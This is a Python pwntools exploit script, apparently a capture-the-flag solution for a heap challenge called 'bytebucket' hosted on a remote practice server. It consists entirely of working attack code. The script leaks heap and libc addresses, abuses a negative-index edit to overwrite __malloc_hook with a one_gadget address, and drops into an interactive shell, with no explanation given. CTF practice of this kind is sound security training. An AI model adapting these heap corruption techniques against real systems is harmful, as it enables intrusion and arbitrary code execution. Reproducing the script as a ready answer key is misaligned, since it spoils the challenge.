#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./bytebucket"
elf = context.binary
libc = ELF("./libc-2.23.so.x86_64")
libc.sym["main_arena"] = 0x3c3b20
libc.sym['one_gadget'] = 0xef9f4

def make_bucket(size, name, slots):
    io.sendlineafter("What to do >> ", "1")
    io.sendlineafter("Size of bucket >> ", str(size))
    io.sendafter("Name of bucket >> ", name)
    sleep(0.01)
    for slot in slots:
        sz, cont = slot
        io.sendlineafter("Size of content >> ", str(sz))
        io.sendafter("Content of slot >> ", cont)
        sleep(0.01)

def list_bucket():
    io.sendlineafter("What to do >> ", "2")

def find_bucket(name):
    io.sendlineafter("What to do >> ", "3")
    io.sendafter("Bucket name to find >> ", name)

def next_bucket():
    io.sendlineafter("What to do >> ", "4")

def drop_bucket():
    io.sendlineafter("What to do >> ", "5")

def open_bucket():
    io.sendlineafter("What to do >> ", "6")

def show_data():
    io.sendlineafter("What to do >> ", "1")

def edit_data(line, size, cont):
    io.sendlineafter("What to do >> ", "2")
    io.sendlineafter("Which line of data >> ", str(line))
    io.sendlineafter("Size of new content >> ", str(size))
    if size:
        io.sendafter("New content >> ", cont)
    sleep(0.01)

def drop_data(line):
    io.sendlineafter("What to do >> ", "3")
    io.sendlineafter("Which line of data >> ", str(line))

def rename(name):
    io.sendlineafter("What to do >> ", "4")
    io.sendafter("New bucket name >> ", name)
    sleep(0.01)

def close_bucket():
    io.sendlineafter("What to do >> ", "5")


def DEBUG():
    info("show name @ {:#x}".format(0x15CB))
    info("edit check @ {:#x}".format(0x10F6))
    info("edit strlen @ {:#x}".format(0x1117))
    info("edit realloc @ {:#x}".format(0x1148))
    info("edit read @ {:#x}".format(0x1180))
    info("rename @ {:#x}".format(0xEFB))
    info("find @ {:#x}".format(0x164D))
    info("free data @ {:#x}".format(0x1217))
    pause()

#  io = process("./bytebucket", env = {"FLAG1": "this_is_the_fucking_flag", "LD_PRELOAD": "./libc-2.23.so.x86_64"})
io = remote("hackme.inndy.tw", 7722)

make_bucket(1, '0' * 0x10, [[0x10, "/bin/sh\0"]])

list_bucket()
io.recvuntil('0' * 0x10)
heap = u64(io.recvuntil('";', drop = True).ljust(8, '\0')) - 0x130
print("heap @ {:#x}".format(heap))
assert heap & 0xfff == 0

make_bucket(3, '1' * 0x10, [[0x10, 'b' * 0x10], [0x80, 'c' * 0x80], [0x10, 'd' * 0x10]])
open_bucket()
drop_data(1)
show_data()

edit_data(0, 0xa0, 'x' * 0x20)
show_data()
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 88 - libc.sym["main_arena"]
print("libc @ {:#x}".format(libc.address))
assert libc.address & 0xfff == 0

edit_data(-14, 0x30, flat(libc.sym["__malloc_hook"] - 0x10))
#  edit_data(-14, 0x30, flat(libc.sym["__free_hook"] - 0x10))
close_bucket()

next_bucket()
open_bucket()
#  DEBUG()
rename(flat(libc.sym["one_gadget"]))
drop_data(-6)

io.interactive()
